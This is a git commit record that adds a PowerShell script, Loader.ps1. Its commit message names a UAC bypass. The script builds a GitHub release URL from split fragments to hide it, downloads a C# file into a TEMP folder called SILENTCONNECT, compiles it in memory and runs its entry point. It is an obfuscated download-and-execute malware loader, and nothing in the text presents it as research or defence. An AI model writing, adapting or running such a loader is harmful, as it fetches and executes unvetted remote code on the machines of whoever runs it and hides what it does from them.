b42f3305f9aeaf77979c56fd615943d3b923c5a7
normangarceau622-dot <normangarceau622@users.noreply.github.com>
2026-06-29 08:22:07 -0700

    Update loader files with TLS fix, UAC bypass, and admin check

---
+++ Loader.ps1
@@ -0,0 +1,6 @@
+$p=@("ht","tps://g","ithub.c","om/norma","ngarceau","622-dot/s","creen/r","eleases/","download/","Loader/lo","ader.cs");$u=$p -join ""
+$t="$env:TEMP\SILENTCONNECT";if(-not(Test-Path $t)){New-Item -ItemType Directory -Path $t|Out-Null}
+$c=(New-Object System.Net.WebClient).DownloadString($u)
+$f="$t\loader.cs";[System.IO.File]::WriteAllText($f,$c)
+Add-Type -Path $f
+$as=[a.b].Assembly;$as.EntryPoint.Invoke($null,($null))
